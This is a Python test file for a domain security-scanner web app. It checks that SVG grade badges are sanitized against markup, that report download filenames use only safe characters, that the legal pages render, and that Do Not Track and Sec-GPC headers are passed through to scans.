# === Security Test 9 — SVG Badge Injection via HTTP ===


class TestBadgeSvgInjectionE2e:
    """LOW: Verify SVG badge grade values can't contain XSS payloads."""

    def test_badge_with_xss_grade_in_db_sanitized(self):
        """Even if DB has a bad grade, SVG output is sanitized to '?'."""
        from db import save_scan

        # Save a scan with XSS-like grade
        save_scan("d" * 32, "xss-badge.com", {"grade": "<img>", "total_score": 50}, "<img>", 50)
        r = client.get("/badge/xss-badge.com.svg")
        assert r.status_code == 200
        assert "<img>" not in r.text
        assert ">?<" in r.text  # sanitized to "?"

    def test_badge_svg_no_script_tags(self):
        """SVG response must never contain script tags."""
        from db import save_scan

        save_scan("f" * 32, "safe-badge.com", {"grade": "A", "total_score": 100}, "A", 100)
        r = client.get("/badge/safe-badge.com.svg")
        assert "<script" not in r.text.lower()

    def test_badge_with_all_valid_grades(self):
        """All valid grades produce correct SVG output."""
        from db import save_scan

        for i, grade in enumerate(["A", "B", "C", "D", "F"]):
            sid = f"{i:032x}"
            domain = f"grade-{grade.lower()}.com"
            save_scan(sid, domain, {"grade": grade, "total_score": 50}, grade, 50)
            r = client.get(f"/badge/{domain}.svg")
            assert r.status_code == 200
            assert f">{grade}<" in r.text


# === Security Test 10 — Content-Disposition via HTTP ===


class TestContentDispositionE2e:
    """LOW: Report filename sanitization in HTTP responses."""

    def test_report_filename_safe_characters_only(self):
        """Report Content-Disposition filename must only have safe chars."""
        with (
            patch("scanner.run_scan", side_effect=mock_run_scan),
            patch("scanner.validate_domain", side_effect=mock_validate_domain),
        ):
            r = client.post("/scan", data={"domain": "example.com"}, follow_redirects=False, headers=CSRF_HEADERS)
            scan_id = r.headers.get("location", "").split("/result/")[-1]

        with patch("main.get_recon", return_value={"status": "done", "result": "{}"}):
            r = client.get(f"/report/{scan_id}.txt")
            cd = r.headers.get("content-disposition", "")
            assert "attachment" in cd
            assert "example.com" in cd
            # No dangerous chars in filename
            import re

            filename_match = re.search(r'filename="([^"]*)"', cd)
            assert filename_match
            filename = filename_match.group(1)
            assert all(
                c in "abcdefghijklmnopqrstuvwxyz0123456789.-" for c in filename.replace("-security-report.txt", "")
            )


# === Privacy & Terms pages ===


class TestLegalPages:
    def test_privacy_page_200(self):
        r = client.get("/privacy")
        assert r.status_code == 200
        assert "Privacy Policy" in r.text
        assert "Do Not Track" in r.text
        assert "90 days" in r.text

    def test_terms_page_200(self):
        r = client.get("/terms")
        assert r.status_code == 200
        assert "Terms of Service" in r.text
        assert "not a substitute" in r.text
        assert "100 requests" in r.text


# === DNT header support ===


class TestDntSupport:
    @patch("main.perform_scan")
    def test_dnt_header_passes_dnt_true(self, mock_scan):
        mock_scan.return_value = ("abc123", {"grade": "A", "total_score": 90})
        client.get("/api/scan?domain=example.com", headers={"dnt": "1"})
        mock_scan.assert_called_once()
        assert mock_scan.call_args[1].get("dnt") is True or mock_scan.call_args[0][2] is True

    @patch("main.perform_scan")
    def test_sec_gpc_header_passes_dnt_true(self, mock_scan):
        mock_scan.return_value = ("abc123", {"grade": "A", "total_score": 90})
        client.get("/api/scan?domain=example.com", headers={"sec-gpc": "1"})
        mock_scan.assert_called_once()
        assert mock_scan.call_args[1].get("dnt") is True or mock_scan.call_args[0][2] is True

    @patch("main.perform_scan")
    def test_no_dnt_header_passes_dnt_false(self, mock_scan):
        mock_scan.return_value = ("abc123", {"grade": "A", "total_score": 90})
        client.get("/api/scan?domain=example.com")
        mock_scan.assert_called_once()
        assert mock_scan.call_args[1].get("dnt") is False or mock_scan.call_args[0][2] is False
